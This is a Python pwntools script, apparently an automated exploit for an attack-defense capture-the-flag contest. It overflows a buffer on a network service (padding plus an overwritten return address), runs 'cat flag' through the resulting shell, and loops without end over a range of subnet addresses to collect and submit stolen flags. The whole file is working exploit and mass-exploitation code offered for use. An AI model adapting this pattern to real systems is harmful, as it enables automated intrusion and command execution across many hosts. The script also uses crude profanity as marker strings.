from pwn import *
from submit import submit
import time
def pwn(ip, port):
    p = remote(ip, port)
    try:

        payload = 'a'*0x28 + p64(0x400977)
        p.sendline(payload)
        time.sleep(1)
        p.sendline('echo fuck1 && cat flag')
        p.recvuntil('fuck1\n')
        flag = p.recvuntil('\n')[:-1]
    except:
        pass
    p.close()
    return flag

def attack():
    ip_list = []
    black_list = [46, 39, 37]
    for i in range(10, 61)[::-1]:
        if i not in black_list:
            ip_list.append('172.16.5.' + str(i))
    for ip in ip_list:
        try:
            flag = pwn(ip, 5068)
            log.success('pwn24 {}:{}'.format(ip, flag))
            i = 0
            while True:
                try:
                    result = submit(flag)
                    log.success(result['msg'])
                    log.success(result)
                    if 'Retry' in result['msg']:
                        time.sleep(3)
                        i += 1
                        if i == 3:
                            break
                        continue
                    break
                except:
                    pass
            
        except:
            log.success('{}:{}'.format(ip, 'fuck'))

if __name__ == '__main__':
    while True:
        attack()

    